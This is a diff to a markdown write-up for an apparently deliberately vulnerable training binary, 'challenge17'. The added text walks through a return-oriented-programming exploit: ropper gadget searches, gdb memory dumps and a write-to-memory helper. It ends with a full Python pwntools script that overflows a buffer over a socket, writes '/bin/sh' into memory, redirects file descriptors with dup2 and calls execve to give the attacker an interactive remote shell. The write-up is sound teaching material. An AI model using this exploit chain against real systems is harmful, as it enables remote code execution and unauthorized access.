@@ -394,6 +394,14 @@ pop rdx; ret    # memory location where we want to write the value
 mov ptr [rdx], rax; ret
 ```
 
+## ROP Gadgets
+
+Search for the following rop gadgets:
+- pop rax
+- mov dword ...
+- and based on the previous one: pop rbp
+
+
 ```
 root@hlUbuntu64:~/challenges/challenge17# ropper --file challenge17 --search  "pop rax"
 [INFO] Load gadgets from cache
@@ -401,14 +409,261 @@ root@hlUbuntu64:~/challenges/challenge17# ropper --file challenge17 --search  "p
 [INFO] Searching for gadgets: pop rax
 
 [INFO] File: challenge17
-0x0000000000400c91: pop rax; nop; pop rbp; ret;
+0x0000000000400c91: pop rax; ret;
 
-root@hlUbuntu64:~/challenges/challenge17# ropper --file challenge17 --search  "mov "
+root@hlUbuntu64:~/challenges/challenge17# ropper --file challenge17 --search  "mov dword"
 [INFO] Load gadgets from cache
 [LOAD] removing double gadgets... 100%
 [INFO] Searching for gadgets: mov
 
 [INFO] File: challenge17
-0x0000000000400c8e: mov dword ptr [rbp - 8], eax; pop rax; nop; pop rbp; ret;
+0x0000000000400c8e: mov dword ptr [rbp - 8], eax; pop rax; ret;
+
+root@hlUbuntu64:~/challenges/challenge17# ropper --file challenge17 --search "pop rbp"
+[...]
+0x00000000004009a0: pop rbp; ret;
+```
+
+The most important one is:
+```
+0x0000000000400c8e: mov dword ptr [rbp - 8], eax; pop rax; ret;
+```
+
+This will copy the content of the register `eax` (note it is not `rax`) at
+the memory location referenced in the register `rbp` minus 8. Therefore if we
+put a destination memory address + 8 into `rbp`, we are able to write 4 bytes
+to it.
+
+
+## write-to-memory function
+
+The string "/bin/sh\x00" is already located in memory. We can use this
+to look at the 4-byte little endian representation of it.
+
+```
+gdb-peda$ x /s 0x400ed8
+0x400ed8:	"/bin/sh"
+gdb-peda$ x/1xg 0x400ed8
+0x400ed8:	0x0068732f6e69622f
+
+gdb-peda$ x/1xw 0x400ed8
+0x400ed8:	0x6e69622f
+gdb-peda$ x/1xw 0x400ed8 + 4
+0x400edf:	0x0068732f
+```
+
+
+## writeable memory
+
+We need a memory location where we can write "/bin/sh" to.
+We will use the rw memory of the code section:
+```
+gdb-peda$ vmmap
+Start              End                Perm	Name
+0x00400000         0x00402000         r-xp	/root/challenges/challenge17/challenge17
+0x00601000         0x00602000         r--p	/root/challenges/challenge17/challenge17
+0x00602000         0x00603000         rw-p	/root/challenges/challenge17/challenge17
+```
+
+Content:
+```
+gdb-peda$ x/32x 0x00602000
+0x602000:	0x0000000000601e28	0x00007ff1a930f168
+0x602010:	0x00007ff1a90ff6a0	0x00007ff1a8e26c80
+0x602020:	0x0000000000400816	0x0000000000400826
+0x602030:	0x00007ff1a8e37ae0	0x00007ff1a8d747b0
+0x602040:	0x0000000000400856	0x0000000000400866
+0x602050:	0x0000000000400876	0x00007ff1a8d3f740
+0x602060:	0x0000000000400896	0x00007ff1a8e26950
+0x602070:	0x00007ff1a8e26830	0x00000000004008c6
+0x602080:	0x00007ff1a8dad7d0	0x00007ff1a8e267d0
+0x602090:	0x00000000004008f6	0x0000000000400906
+0x6020a0:	0x0000000000400916	0x00007ff1a8e26ce0
+0x6020b0:	0x0000000000000000	0x0000000000000000
+0x6020c0 <binsh>:	0x0000000000400ed8	0x00007ff1a90e3620
+0x6020d0 <completed.7585>:	0x0000000000000000	0x0000000000000000
+0x6020e0:	0x0000000000000000	0x0000000000000000
+0x6020f0:	0x0000000000000000	0x0000000000000000
+gdb-peda$
+0x602100:	0x0000000000000000	0x0000000000000000
+0x602110:	0x0000000000000000	0x0000000000000000
+0x602120:	0x0000000000000000	0x0000000000000000
+```
+
+Lets take a memory location with some zero bytes, e.g. `0x602100`.
+
+## write2mem exploit part
+
+All this combined results to:
+```
+# writeable data addr
+sh_addr = 0x602100
+
+# 0x0000000000400c91: pop rax; ret;
+pop_rax = 0x0000000000400c91
+
+# 0x00000000004009a0: pop rbp; ret;
+pop_rbp = 0x00000000004009a0
+
+# 0x0000000000400c8e: mov dword ptr [rbp - 8], eax; pop rax; ret;
+mov_ptr_rbp_eax = 0x0000000000400c8e
+
+def write2mem(data, location):
+        chain = ""
+
+        chain += p64( pop_rax )
+        chain += p64( data )
+
+        chain += p64( pop_rbp )
+        chain += p64( location + 8)
+
+        chain += p64( mov_ptr_rbp_eax)
+        chain += p64( 0xdeadbeef1 )     # dead pop rax of gadget
+
+        return chain
+
+
+payload = "A" * offset
+
+# write "/bin/sh" to sh_addr
+# the write2mem gadget uses "eax", 4 bytes,
+# so we have to write the string as 2 x 4 bytes
+payload += write2mem(binsh1, sh_addr)
+payload += write2mem(binsh2, sh_addr+4)
+```
+
+
+## Full exploit
+
+```
+#!/usr/bin/python
+
+import struct
+from pwn import *
+
+e = ELF("./challenge17")
+tube = connect("localhost", 5002)
+
+# offset to SIP
+offset = 152
+
+# writeable data addr
+sh_addr = 0x602100
+
+
+# gadgets
+
+# 0x0000000000400c91: pop rax; ret;
+pop_rax = 0x0000000000400c91
+
+# 0x0000000000400eb3: pop rdi; ret;
+pop_rdi = 0x0000000000400eb3
+
+# 0x0000000000400eb1: pop rsi; pop r15; ret;
+pop_rsi_r15 = 0x0000000000400eb1
+
+# 0x0000000000400c93: syscall; ret;
+syscall = 0x0000000000400c93
+
+# 0x00000000004009a0: pop rbp; ret;
+pop_rbp = 0x00000000004009a0
+
+# 0x0000000000400c8e: mov dword ptr [rbp - 8], eax; pop rax; ret;
+mov_ptr_rbp_eax = 0x0000000000400c8e
+
+# the string "/bin/sh" as two 4-byte integer in little endian
+binsh1 = 0x6e69622f
+binsh2 = 0x0068732f
+
+def write2mem(data, location):
+        chain = ""
+
+        chain += p64( pop_rax )
+        chain += p64( data )
+
+        chain += p64( pop_rbp )
+        chain += p64( location + 8)
+
+        chain += p64( mov_ptr_rbp_eax)
+        chain += p64( 0xdeadbeef1 )     # pop rax
+
+        return chain
+
+def doBof(payload):
+        print tube.recvuntil("> ")
+        tube.send("1");
+
+        print tube.recv()
+        tube.send(str(len(payload)));
+
+        print tube.recv()
+        tube.send(payload)
+
+        print tube.recv()
+
+        tube.interactive()
+
+
+payload = "A" * offset
+
+# write "/bin/sh" to sh_addr
+# the write2mem gadget uses "eax", 4 bytes,
+# so we have to write the string as 2 x 4 bytes
+payload += write2mem(binsh1, sh_addr)
+payload += write2mem(binsh2, sh_addr+4)
+
+
+# Start ROP chain
+
+# dup2() syscall is 33
+
+# dup2(4, 0)
+payload += p64 ( pop_rax )
+payload += p64 ( 33 )
+payload += p64 ( pop_rdi )
+payload += p64 ( 4 )
+payload += p64 ( pop_rsi_r15)
+payload += p64 ( 0 )
+payload += p64 ( 0xdeadbeef1 )
+payload += p64 ( syscall )
+
+# dup2(4, 1)
+payload += p64 ( pop_rax )
+payload += p64 ( 33 )
+payload += p64 ( pop_rdi )
+payload += p64 ( 4 )
+payload += p64 ( pop_rsi_r15)
+payload += p64 ( 1 )
+payload += p64 ( 0xdeadbeef2 )
+payload += p64 ( syscall )
+
+
+# dup2(4, 2)
+payload += p64 ( pop_rax )
+payload += p64 ( 33 )
+payload += p64 ( pop_rdi )
+payload += p64 ( 4 )
+payload += p64 ( pop_rsi_r15)
+payload += p64 ( 2 )
+payload += p64 ( 0xdeadbeef3 )
+payload += p64 ( syscall )
+
+
+# execve
+payload += p64 ( pop_rdi )
+payload += p64 ( sh_addr )
+payload += p64 ( pop_rsi_r15 )
+payload += p64 ( 0x6020e0 )
+payload += p64 ( 0xdeadbeef4 )
+payload += p64 ( pop_rax)
+payload += p64 ( 59 )
+payload += p64 ( syscall )
+
+# if it crashes here (rip=0x41414141),
+# something went wrong. the syscall did not
+# execute correctly.
+payload += p64 ( 0x41414141 )
+
+doBof(payload)
 
 ```
